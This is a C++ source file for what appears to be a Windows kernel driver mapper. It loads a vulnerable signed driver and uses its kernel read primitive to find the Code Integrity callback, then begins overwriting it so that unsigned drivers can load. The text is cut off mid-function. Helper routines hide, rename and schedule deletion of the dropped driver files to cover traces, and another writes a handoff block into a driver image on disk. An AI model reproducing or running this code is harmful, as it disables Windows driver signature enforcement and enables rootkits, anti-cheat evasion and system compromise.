
#include "Mapper.h"
#include "EmbeddedDriver.h"
#include "../../driver/sentinel_handoff.h"
#include <Shlwapi.h>
#include <shlobj.h>
#include <filesystem>
#include <cstdio>
#include <cstdarg>
#include <cstring>
#include <tlhelp32.h>
#include <string>
#include <initguid.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>
#include <io.h>

// ============ DEBUG LOGGING ============
FILE* g_LogFile = nullptr;

void FlushMapperLogFile() {
    if (!g_LogFile) {
        return;
    }

    fflush(g_LogFile);
    intptr_t osHandle = _get_osfhandle(_fileno(g_LogFile));
    if (osHandle != -1) {
        FlushFileBuffers(reinterpret_cast<HANDLE>(osHandle));
    }
}

static void DbgLog(const char* func, const char* fmt, ...) {
    char buf[2048];
    va_list args;
    va_start(args, fmt);

    SYSTEMTIME st = {};
    GetLocalTime(&st);
    int prefixLen = snprintf(buf, sizeof(buf),
        "[%04u-%02u-%02u %02u:%02u:%02u.%03u] [WindMapper][%s] ",
        st.wYear,
        st.wMonth,
        st.wDay,
        st.wHour,
        st.wMinute,
        st.wSecond,
        st.wMilliseconds,
        func);
    if (prefixLen < 0) prefixLen = 0;
    vsnprintf(buf + prefixLen, sizeof(buf) - prefixLen, fmt, args);
    va_end(args);

    // Console
    printf("%s\n", buf);
    fflush(stdout);

    // Debug output (visible in WinDbg/DebugView)
    OutputDebugStringA(buf);
    OutputDebugStringA("\n");

    // File log
    if (g_LogFile) {
        fprintf(g_LogFile, "%s\n", buf);
        FlushMapperLogFile();
    }
}

#define LOG(fmt, ...) DbgLog(__FUNCTION__, fmt, ##__VA_ARGS__)
#define LOG_STATUS(msg, st) DbgLog(__FUNCTION__, "%s: 0x%08X (%s)", msg, (DWORD)(st), NT_SUCCESS(st) ? "SUCCESS" : "FAILED")

static ULONGLONG MapperElapsedMs(ULONGLONG start)
{
    ULONGLONG now = GetTickCount64();
    return now >= start ? now - start : 0;
}

static ULONG MapperBuildNumber()
{
    return *reinterpret_cast<volatile ULONG*>(static_cast<ULONG_PTR>(0x7FFE0260)) & 0xFFFFu;
}

static bool g_LastTriggerDeferredSentinelLiveQueries = false;

static void MapperFileNameAnsi(PCWSTR path, char* out, size_t out_count)
{
    if (!out || out_count == 0) {
        return;
    }

    out[0] = '\0';
    if (!path || !path[0]) {
        return;
    }

    PCWSTR name = wcsrchr(path, L'\\');
    name = name ? name + 1 : path;
    WideCharToMultiByte(CP_ACP, 0, name, -1, out, static_cast<int>(out_count), nullptr, nullptr);
    out[out_count - 1] = '\0';
}

static void LogKernelModuleSnapshot(const char* phase, PCWSTR target, PCWSTR sentinel, PCWSTR shadowfs)
{
    const ULONGLONG start = GetTickCount64();
    const char* phase_name = phase ? phase : "unknown";
    if (!NtQuerySystemInformationPtr) {
        LOG("module_snapshot phase=%s skipped reason=NtQuerySystemInformation_unresolved pid=%lu tid=%lu build=%lu",
            phase_name,
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            MapperBuildNumber());
        return;
    }

    ULONG returnLength = 0;
    NTSTATUS status = NtQuerySystemInformationPtr(11, nullptr, 0, &returnLength);
    ULONG bufferSize = returnLength + 4096;
    if (bufferSize < 65536) {
        bufferSize = 65536;
    }

    PVOID buffer = nullptr;
    for (ULONG attempt = 0; attempt < 3; ++attempt) {
        if (buffer) {
            VirtualFree(buffer, 0, MEM_RELEASE);
            buffer = nullptr;
        }
        buffer = VirtualAlloc(nullptr, bufferSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) {
            LOG("module_snapshot phase=%s alloc_failed size=%lu gle=%lu elapsed_ms=%llu",
                phase_name,
                bufferSize,
                GetLastError(),
                MapperElapsedMs(start));
            return;
        }
        status = NtQuerySystemInformationPtr(11, buffer, bufferSize, &returnLength);
        if (status != STATUS_INFO_LENGTH_MISMATCH) {
            break;
        }
        bufferSize = returnLength + 4096;
    }

    if (!NT_SUCCESS(status)) {
        LOG("module_snapshot phase=%s query_failed status=0x%08X returnLength=%lu bufferSize=%lu elapsed_ms=%llu",
            phase_name,
            (DWORD)status,
            returnLength,
            bufferSize,
            MapperElapsedMs(start));
        if (buffer) {
            VirtualFree(buffer, 0, MEM_RELEASE);
        }
        return;
    }

    char targetName[260] = {};
    char sentinelName[260] = {};
    char shadowName[260] = {};
    MapperFileNameAnsi(target, targetName, sizeof(targetName));
    MapperFileNameAnsi(sentinel, sentinelName, sizeof(sentinelName));
    MapperFileNameAnsi(shadowfs, shadowName, sizeof(shadowName));

    PRTL_PROCESS_MODULES modules = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer);
    PVOID targetBase = nullptr;
    PVOID sentinelBase = nullptr;
    PVOID shadowBase = nullptr;
    ULONG targetSize = 0;
    ULONG sentinelSize = 0;
    ULONG shadowSize = 0;

    for (ULONG i = 0; i < modules->NumberOfModules; ++i) {
        auto& mod = modules->Modules[i];
        const char* fileName = reinterpret_cast<const char*>(mod.FullPathName + mod.OffsetToFileName);
        if (i < 8) {
            LOG("module_snapshot phase=%s module[%lu]='%s' base=%p size=0x%X flags=0x%X load=%u init=%u",
                phase_name,
                i,
                fileName,
                mod.ImageBase,
                mod.ImageSize,
                mod.Flags,
                mod.LoadOrderIndex,
                mod.InitOrderIndex);
        }
        if (targetName[0] && _stricmp(fileName, targetName) == 0) {
            targetBase = mod.ImageBase;
            targetSize = mod.ImageSize;
        }
        if (sentinelName[0] && _stricmp(fileName, sentinelName) == 0) {
            sentinelBase = mod.ImageBase;
            sentinelSize = mod.ImageSize;
        }
        if (shadowName[0] && _stricmp(fileName, shadowName) == 0) {
            shadowBase = mod.ImageBase;
            shadowSize = mod.ImageSize;
        }
    }

    LOG("module_snapshot phase=%s status=0x%08X modules=%lu pid=%lu tid=%lu build=%lu target='%s' target_base=%p target_size=0x%X sentinel='%s' sentinel_base=%p sentinel_size=0x%X shadow='%s' shadow_base=%p shadow_size=0x%X ci_patched=%u ci_addr=%p original_ci=%p elapsed_ms=%llu",
        phase_name,
        (DWORD)status,
        modules->NumberOfModules,
        GetCurrentProcessId(),
        GetCurrentThreadId(),
        MapperBuildNumber(),
        targetName[0] ? targetName : "(none)",
        targetBase,
        targetSize,
        sentinelName[0] ? sentinelName : "(none)",
        sentinelBase,
        sentinelSize,
        shadowName[0] ? shadowName : "(none)",
        shadowBase,
        shadowSize,
        g_CiCallbackPatched ? 1u : 0u,
        g_CiCallbackAddress,
        g_OriginalCiCallback,
        MapperElapsedMs(start));

    VirtualFree(buffer, 0, MEM_RELEASE);
}

static BOOL PreseedSentinelFileHandoff(PCWSTR sentinelPath, PVOID whoswhoBase, ULONG whoswhoSize)
{
    const ULONGLONG start = GetTickCount64();
    LOG("PreseedSentinelFileHandoff begin path=%ls whoswho_base=%p whoswho_size=0x%X build=%lu",
        sentinelPath ? sentinelPath : L"(null)",
        whoswhoBase,
        whoswhoSize,
        MapperBuildNumber());

    if (!sentinelPath || !sentinelPath[0] || !whoswhoBase || whoswhoSize == 0) {
        LOG("PreseedSentinelFileHandoff invalid_arg path_present=%u whoswho_base=%p whoswho_size=0x%X elapsed_ms=%llu",
            sentinelPath && sentinelPath[0] ? 1u : 0u,
            whoswhoBase,
            whoswhoSize,
            MapperElapsedMs(start));
        return FALSE;
    }

    HANDLE file = CreateFileW(
        sentinelPath,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        LOG("PreseedSentinelFileHandoff open_failed path=%ls gle=%lu elapsed_ms=%llu",
            sentinelPath,
            GetLastError(),
            MapperElapsedMs(start));
        return FALSE;
    }

    LARGE_INTEGER fileSize = {};
    if (!GetFileSizeEx(file, &fileSize) || fileSize.QuadPart < static_cast<LONGLONG>(sizeof(IMAGE_DOS_HEADER))) {
        LOG("PreseedSentinelFileHandoff size_failed path=%ls gle=%lu size=%lld elapsed_ms=%llu",
            sentinelPath,
            GetLastError(),
            static_cast<long long>(fileSize.QuadPart),
            MapperElapsedMs(start));
        CloseHandle(file);
        return FALSE;
    }

    auto fail_close = [&](const char* reason, DWORD detail) -> BOOL {
        LOG("PreseedSentinelFileHandoff failed reason=%s detail=0x%08lX elapsed_ms=%llu",
            reason ? reason : "unknown",
            detail,
            MapperElapsedMs(start));
        CloseHandle(file);
        return FALSE;
    };

    IMAGE_DOS_HEADER dos = {};
    DWORD bytes = 0;
    LARGE_INTEGER pos = {};
    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
        !ReadFile(file, &dos, sizeof(dos), &bytes, nullptr) ||
        bytes != sizeof(dos) ||
        dos.e_magic != IMAGE_DOS_SIGNATURE ||
        dos.e_lfanew <= 0) {
        return fail_close("dos_header", GetLastError());
    }

    if (static_cast<LONGLONG>(dos.e_lfanew) + static_cast<LONGLONG>(sizeof(IMAGE_NT_HEADERS64)) > fileSize.QuadPart) {
        return fail_close("nt_header_bounds", static_cast<DWORD>(dos.e_lfanew));
    }

    IMAGE_NT_HEADERS64 nt = {};
    pos.QuadPart = dos.e_lfanew;
    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
        !ReadFile(file, &nt, sizeof(nt), &bytes, nullptr) ||
        bytes != sizeof(nt) ||
        nt.Signature != IMAGE_NT_SIGNATURE ||
        nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return fail_close("nt_header", GetLastError());
    }

    WORD sectionsCount = nt.FileHeader.NumberOfSections;
    if (sectionsCount == 0 || sectionsCount > 64) {
        return fail_close("section_count", sectionsCount);
    }

    ULONGLONG sectionTableOffset =
        static_cast<ULONGLONG>(dos.e_lfanew) +
        offsetof(IMAGE_NT_HEADERS64, OptionalHeader) +
        nt.FileHeader.SizeOfOptionalHeader;
    ULONGLONG sectionBytes = static_cast<ULONGLONG>(sectionsCount) * sizeof(IMAGE_SECTION_HEADER);
    if (sectionTableOffset + sectionBytes > static_cast<ULONGLONG>(fileSize.QuadPart)) {
        return fail_close("section_table_bounds", static_cast<DWORD>(sectionTableOffset));
    }

    IMAGE_SECTION_HEADER sections[64] = {};
    pos.QuadPart = static_cast<LONGLONG>(sectionTableOffset);
    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
        !ReadFile(file, sections, static_cast<DWORD>(sectionBytes), &bytes, nullptr) ||
        bytes != static_cast<DWORD>(sectionBytes)) {
        return fail_close("section_table_read", GetLastError());
    }

    const IMAGE_SECTION_HEADER* sntl = nullptr;
    for (WORD i = 0; i < sectionsCount; ++i) {
        char secName[9] = {};
        memcpy(secName, sections[i].Name, 8);
        LOG("PreseedSentinelFileHandoff section[%u] name='%s' raw=0x%X raw_size=0x%X va=0x%X vsize=0x%X",
            i,
            secName,
            sections[i].PointerToRawData,
            sections[i].SizeOfRawData,
            sections[i].VirtualAddress,
            sections[i].Misc.VirtualSize);
        if (memcmp(sections[i].Name, ".sntl\0\0\0", 8) == 0) {
            sntl = &sections[i];
            break;
        }
    }

    if (!sntl) {
        return fail_close("sntl_missing", sectionsCount);
    }

    ULONGLONG rawOffset = sntl->PointerToRawData;
    ULONGLONG rawSize = sntl->SizeOfRawData;
    ULONGLONG fileBytes = static_cast<ULONGLONG>(fileSize.QuadPart);
    if (rawOffset == 0 || rawSize < sizeof(aida_sentinel_handoff_block) ||
        rawOffset > fileBytes || rawSize > fileBytes - rawOffset) {
        return fail_close("sntl_bounds", static_cast<DWORD>(rawOffset));
    }

    aida_sentinel_handoff_block handoff = {};
    PVOID objectValue = nullptr;
    aida_sentinel_handoff_prepare(&handoff, whoswhoBase, objectValue, whoswhoSize);

    pos.QuadPart = static_cast<LONGLONG>(rawOffset);
    bytes = 0;
    const DWORD handoffBytes = static_cast<DWORD>(sizeof(handoff));
    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
        !WriteFile(file, &handoff, handoffBytes, &bytes, nullptr) ||
        bytes != handoffBytes) {
        return fail_close("handoff_write", GetLastError());
    }

    FlushFileBuffers(file);

    aida_sentinel_handoff_block verifyBlock = {};
    pos.QuadPart = static_cast<LONGLONG>(rawOffset);
    bytes = 0;
    if (!SetFilePointerEx(file, pos, nullptr, FILE_BEGIN) ||
        !ReadFile(file, &verifyBlock, handoffBytes, &bytes, nullptr) ||
        bytes != handoffBytes) {
        return fail_close("handoff_verify_read", GetLastError());
    }

    PVOID verifyBase = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_base));
    PVOID verifyObject = reinterpret_cast<PVOID>(static_cast<ULONG_PTR>(verifyBlock.target_object));
    BOOL validBlock = aida_sentinel_handoff_valid(&verifyBlock);
    BOOL match = validBlock && verifyBase == whoswhoBase && verifyObject == nullptr && verifyBlock.target_size == whoswhoSize;
    LOG("PreseedSentinelFileHandoff verify raw=0x%llX magic=0x%08X version=%u block_size=0x%X checksum=0x%08X valid=%u base=%p expected_base=%p object=%p size=0x%X expected_size=0x%X match=%u elapsed_ms=%llu",
        static_cast<unsigned long long>(rawOffset),
        verifyBlock.magic,
        verifyBlock.version,
        verifyBlock.size,
        verifyBlock.checksum,
        validBlock ? 1u : 0u,
        verifyBase,
        whoswhoBase,
        verifyObject,
        verifyBlock.target_size,
        whoswhoSize,
        match ? 1u : 0u,
        MapperElapsedMs(start));

    CloseHandle(file);
    return match;
}

static void OpenMapperLog()
{
    char logPath[MAX_PATH] = {};
    DWORD envLen = GetEnvironmentVariableA("AIDA_MAPPER_LOG", logPath, static_cast<DWORD>(sizeof(logPath)));
    if (envLen > 0 && envLen < sizeof(logPath)) {
        fopen_s(&g_LogFile, logPath, "w");
        if (g_LogFile) {
            setvbuf(g_LogFile, nullptr, _IONBF, 0);
        }
    }

    if (!g_LogFile) {
        OutputDebugStringA("[WindMapper][OpenMapperLog] failed to open file log\n");
    }
}

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")

namespace Utils {

    std::wstring GenerateRandomName(size_t length) {
        static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));

        std::wstring result;
        result.reserve(length);

        for (size_t i = 0; i < length; i++) {
            result += charset[dist(gen)];
        }

        return result;
    }

    BOOL InitializeNtFunctions() {
        LOG("Resolving ntdll function pointers...");
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
            if (!ntdll) {
                LOG("FATAL: Failed to load ntdll.dll, GLE=%u", GetLastError());
                return FALSE;
            }
        }
        LOG("ntdll.dll base: %p", ntdll);

        NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(ntdll, "NtQuerySystemInformation")
        );

        NtLoadDriverPtr = reinterpret_cast<pNtLoadDriver>(
            GetProcAddress(ntdll, "NtLoadDriver")
        );

        NtUnloadDriverPtr = reinterpret_cast<pNtUnloadDriver>(
            GetProcAddress(ntdll, "NtUnloadDriver")
        );

        RtlAdjustPrivilegePtr = reinterpret_cast<pRtlAdjustPrivilege>(
            GetProcAddress(ntdll, "RtlAdjustPrivilege")
        );

        RtlGetFullPathName_UExPtr = reinterpret_cast<pRtlGetFullPathName_UEx>(
            GetProcAddress(ntdll, "RtlGetFullPathName_UEx")
        );

        RtlCreateRegistryKeyPtr = reinterpret_cast<pRtlCreateRegistryKey>(
            GetProcAddress(ntdll, "RtlCreateRegistryKey")
        );

        RtlWriteRegistryValuePtr = reinterpret_cast<pRtlWriteRegistryValue>(
            GetProcAddress(ntdll, "RtlWriteRegistryValue")
        );

        NtDeviceIoControlFilePtr = reinterpret_cast<pNtDeviceIoControlFile>(
            GetProcAddress(ntdll, "NtDeviceIoControlFile")
        );

        NtDeleteKeyPtr = reinterpret_cast<pNtDeleteKey>(
            GetProcAddress(ntdll, "NtDeleteKey")
        );

        NtOpenKeyPtr = reinterpret_cast<pNtOpenKey>(
            GetProcAddress(ntdll, "NtOpenKey")
        );

        NtFlushKeyPtr = reinterpret_cast<pNtFlushKey>(
            GetProcAddress(ntdll, "NtFlushKey")
        );


        NtCreateFilePtr = reinterpret_cast<pNtCreateFile>(
            GetProcAddress(ntdll, "NtCreateFile")
        );
        NtSetInformationFilePtr = reinterpret_cast<pNtSetInformationFile>(
            GetProcAddress(ntdll, "NtSetInformationFile")
        );

        BOOL result = NtQuerySystemInformationPtr && NtLoadDriverPtr &&
               NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
               RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
               RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;

        LOG("NtQuerySystemInformation: %p", NtQuerySystemInformationPtr);
        LOG("NtLoadDriver: %p", NtLoadDriverPtr);
        LOG("NtUnloadDriver: %p", NtUnloadDriverPtr);
        LOG("RtlAdjustPrivilege: %p", RtlAdjustPrivilegePtr);
        LOG("NtDeviceIoControlFile: %p", NtDeviceIoControlFilePtr);
        LOG("NtDeleteKey: %p, NtOpenKey: %p, NtFlushKey: %p", NtDeleteKeyPtr, NtOpenKeyPtr, NtFlushKeyPtr);
        LOG("NtCreateFile: %p, NtSetInformationFile: %p", NtCreateFilePtr, NtSetInformationFilePtr);
        LOG("InitializeNtFunctions result: %s", result ? "OK" : "FAILED (missing critical functions)");
        return result;
    }

    NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
        BOOLEAN wasEnabled;
        return RtlAdjustPrivilegePtr(privilege, enable, FALSE, &wasEnabled);
    }

    NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength) {
        return RtlGetFullPathName_UExPtr(fileName, bufferLength, buffer, nullptr, nullptr);
    }

    BOOL SecureDeleteFile(PCWSTR filePath) {
        HANDLE hFile = CreateFileW(
            filePath,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                DWORD chunkSize = 4096;
                BYTE zeroBuffer[4096];
                SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));

                SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(chunkSize), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                    remaining -= written;
                    if (written == 0) break;
                }
                FlushFileBuffers(hFile);
            }
            CloseHandle(hFile);
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(filePath);
    }


    BOOL PosixDeleteFile(PCWSTR filePath) {
        if (!filePath || !NtCreateFilePtr || !NtSetInformationFilePtr)
            return FALSE;


        WCHAR ntPath[520] = {};
        wcscpy_s(ntPath, L"\\??\\");
        wcscat_s(ntPath, filePath);

        UNICODE_STRING uniPath;
        RtlInitUnicodeString(&uniPath, ntPath);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uniPath,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};

        NTSTATUS status = NtCreateFilePtr(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );

        if (!NT_SUCCESS(status))
            return FALSE;


        struct {
            ULONG Flags;
        } dispEx;
        dispEx.Flags = 0x1
                     | 0x2
                     | 0x10;

        status = NtSetInformationFilePtr(
            fileHandle, &ioStatus,
            &dispEx, sizeof(dispEx),
            static_cast<FILE_INFORMATION_CLASS>(64)
        );

        NtClose(fileHandle);
        return NT_SUCCESS(status);
    }


    std::wstring GetRandomSystemDirectory() {
        wchar_t* local = nullptr;
        if (FAILED(SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_CREATE, nullptr, &local)) || !local)
            return L"";
        std::filesystem::path p(local);
        CoTaskMemFree(local);
        p /= L"AiDA";
        p /= L"Standalone";
        p /= L"DriverRuntime";
        std::error_code ec;
        std::filesystem::create_directories(p, ec);
        if (ec)
            return L"";
        std::wstring dir = p.wstring();
        DWORD attr = GetFileAttributesW(dir.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY))
            return L"";
        return dir;
    }

    BOOL ForceDeleteOrRename(PCWSTR filePath) {

        if (DeleteFileW(filePath)) {
            return TRUE;
        }


        if (PosixDeleteFile(filePath)) {
            return TRUE;
        }


        std::wstring hideDir = GetRandomSystemDirectory();
        if (!hideDir.empty()) {
            std::wstring newName = hideDir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, newName.c_str())) {
                SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
                MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                return TRUE;
            }
        }


        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
        MoveFileExW(filePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return FALSE;
    }

    BOOL HideLoadedImagePath(PCWSTR filePath) {
        if (!filePath || !filePath[0])
            return FALSE;

        DWORD attr = GetFileAttributesW(filePath);
        if (attr == INVALID_FILE_ATTRIBUTES) {
            DWORD gle = GetLastError();
            return gle == ERROR_FILE_NOT_FOUND || gle == ERROR_PATH_NOT_FOUND;
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);

        std::wstring cleanupPath = filePath;
        PCWSTR lastSlash = wcsrchr(filePath, L'\\');
        if (lastSlash && lastSlash > filePath) {
            std::wstring dir(filePath, lastSlash - filePath);
            std::wstring renamePath = dir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, renamePath.c_str())) {
                cleanupPath = renamePath;
                SetFileAttributesW(cleanupPath.c_str(),
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
            }
        }

        BOOL scheduled = MoveFileExW(cleanupPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        if (!scheduled) {
            SetFileAttributesW(cleanupPath.c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY);
        }

        return scheduled || cleanupPath != filePath;
    }

    std::wstring GetTempFilePath(PCWSTR extension) {
        std::wstring dir = GetRandomSystemDirectory();
        if (dir.empty())
            return L"";

        std::wstring name = GenerateRandomName(12);
        return dir + L"\\" + name + extension;
    }

    std::wstring GetSiblingTempFilePath(PCWSTR basePath, PCWSTR extension) {
        if (!basePath || !basePath[0])
            return GetTempFilePath(extension);

        PCWSTR slash = wcsrchr(basePath, L'\\');
        if (!slash || slash == basePath)
            return GetTempFilePath(extension);

        std::wstring dir(basePath, slash - basePath);
        if (dir.empty())
            return GetTempFilePath(extension);

        std::wstring probe = dir + L"\\" + GenerateRandomName(8) + L".tmp";
        HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
            CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
        if (hProbe == INVALID_HANDLE_VALUE)
            return GetTempFilePath(extension);

        CloseHandle(hProbe);
        return dir + L"\\" + GenerateRandomName(12) + extension;
    }


}

namespace MapperCore {

    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName,
                            PCWSTR shadowFsDriverFileName, PCWSTR targetDriverFullPath,
                            PCWSTR sentinelDriverFullPath, PCWSTR shadowFsDriverFullPath,
                            PCWSTR loaderDriverFullPath) {
        LOG("=== TriggerExploit START ===");
        g_LastTriggerDeferredSentinelLiveQueries = false;
        const ULONGLONG exploitStartTick = GetTickCount64();
        LOG("TriggerExploit context pid=%lu tid=%lu tick=%llu loader_service=%ls target_service=%ls sentinel_service=%ls shadowfs_service=%ls",
            GetCurrentProcessId(),
            GetCurrentThreadId(),
            static_cast<unsigned long long>(exploitStartTick),
            g_LoaderServicePath,
            g_DriverServicePath,
            g_SentinelServicePath,
            g_ShadowFsServicePath);
        LOG("TriggerExploit paths build=%lu loader_full=%ls target_full=%ls sentinel_full=%ls shadowfs_full=%ls",
            MapperBuildNumber(),
            loaderDriverFullPath ? loaderDriverFullPath : L"(null)",
            targetDriverFullPath ? targetDriverFullPath : L"(null)",
            sentinelDriverFullPath ? sentinelDriverFullPath : L"(null)",
            shadowFsDriverFullPath ? shadowFsDriverFullPath : L"(null)");
        LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
        LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
        LogKernelModuleSnapshot("trigger_entry", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);

        PVOID cachedTargetBase = nullptr;
        ULONG cachedTargetImageSize = 0;
        PVOID cachedSentinelBase = nullptr;
        ULONG cachedSentinelImageSize = 0;
        PVOID cachedShadowFsBase = nullptr;
        ULONG cachedShadowFsImageSize = 0;
        bool sentinelGlobalsWritten = false;
        bool sentinelFilePreseeded = false;
        bool deferSentinelLiveQueries = false;
        const ULONG mapperBuild = MapperBuildNumber();
        const bool requireSentinelFilePreseed = mapperBuild >= 26100;

        HANDLE deviceHandle = nullptr;
        const ULONGLONG openStartTick = GetTickCount64();
        NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);
        LOG_STATUS("OpenDevice (initial attempt)", status);
        LOG("OpenDevice initial detail status=0x%08X handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
            (DWORD)status,
            deviceHandle,
            MapperElapsedMs(openStartTick),
            MapperElapsedMs(exploitStartTick));

        if (!NT_SUCCESS(status)) {
            LOG("Device not open, loading vuln driver via service...");
            const ULONGLONG loaderLoadStartTick = GetTickCount64();
            status = DriverLoader::LoadDriver(g_LoaderServicePath, loaderDriverFullPath);
            LOG_STATUS("LoadDriver (vuln/loader)", status);
            LOG("LoadDriver loader detail status=0x%08X service=%ls elapsed_ms=%llu total_elapsed_ms=%llu",
                (DWORD)status,
                g_LoaderServicePath,
                MapperElapsedMs(loaderLoadStartTick),
                MapperElapsedMs(exploitStartTick));
            LogKernelModuleSnapshot("after_loader_load", targetDriverFileName, sentinelDriverFileName, shadowFsDriverFileName);

            if (!NT_SUCCESS(status) &&
                status != STATUS_OBJECT_NAME_COLLISION &&
                status != STATUS_IMAGE_ALREADY_LOADED) {
                LOG("FATAL: LoadDriver failed with non-recoverable status 0x%08X", (DWORD)status);
                return status;
            }
            LOG("Waiting for device to appear (retrying up to 10 times)...");
            for (int retry = 0; retry < 10; retry++) {
                Sleep(100);
                const ULONGLONG retryStartTick = GetTickCount64();
                status = VulnDriver::OpenDevice(&deviceHandle);
                LOG("OpenDevice retry=%d status=0x%08X handle=%p elapsed_ms=%llu total_elapsed_ms=%llu",
                    retry,
                    (DWORD)status,
                    deviceHandle,
                    MapperElapsedMs(retryStartTick),
                    MapperElapsedMs(exploitStartTick));
                if (NT_SUCCESS(status)) {
                    LOG("Device opened on retry %d, handle=%p", retry, deviceHandle);
                    break;
                }
            }

            if (!NT_SUCCESS(status)) {
                LOG("FATAL: Device never appeared after 10 retries, status=0x%08X", (DWORD)status);
                return status;
            }
        } else {
            LOG("Device already open, handle=%p", deviceHandle);
        }
        {
            PVOID ciValidateImageHeaderEntry = nullptr;
            PVOID zwFlushInstructionCache = nullptr;

            LOG("Resolving CiValidateImageHeader entry and ZwFlushInstructionCache...");
            BOOL ciResult = KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache);
            LOG("GetCiValidateImageHeaderEntry: %s, entry=%p, zwFlush=%p", ciResult ? "TRUE" : "FALSE",
                ciValidateImageHeaderEntry, zwFlushInstructionCache);

            if (ciResult && ciValidateImageHeaderEntry && zwFlushInstructionCache) {

                PVOID originalCallback = nullptr;
                LOG("Reading original CI callback from kernel addr %p...", ciValidateImageHeaderEntry);
                const ULONGLONG readCiStartTick = GetTickCount64();
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                LOG_STATUS("ReadKernelMemory (original CI callback)", status);
                LOG("Original CI callback value: %p", originalCallback);
                LOG("CI original read detail status=0x%08X addr=%p value=%p elapsed_ms=%llu total_elapsed_ms=%llu",
                    (DWORD)status,
                    ciValidateImageHeaderEntry,
                    originalCallback,
                    MapperElapsedMs(readCiStartTick),
                    MapperElapsedMs(exploitStartTick));

                if (NT_SUCCESS(status)) {
                    g_OriginalCiCallback = originalCallback;
                    g_CiCallbackAddress = ciValidateImageHeaderEntry;

                    LOG("Patching CI callback -> ZwFlushInstructionCache (%p)...", zwFlushInstructionCache);
